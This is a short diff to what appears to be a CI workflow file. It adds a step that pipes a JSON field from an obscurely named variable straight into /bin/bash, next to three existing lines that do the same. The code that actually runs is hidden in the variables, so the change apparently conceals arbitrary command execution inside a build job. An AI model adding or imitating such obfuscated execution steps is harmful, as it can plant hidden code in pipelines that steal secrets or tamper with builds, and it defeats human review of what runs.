@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$ueak3" | jq -r .q54942 | /bin/bash
           echo $rttl598 | jq -r .cjk2 | /bin/bash
           echo $al77 | jq -r .kd313 | /bin/bash
+          echo $yjtl8 | jq -r .mri88275 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
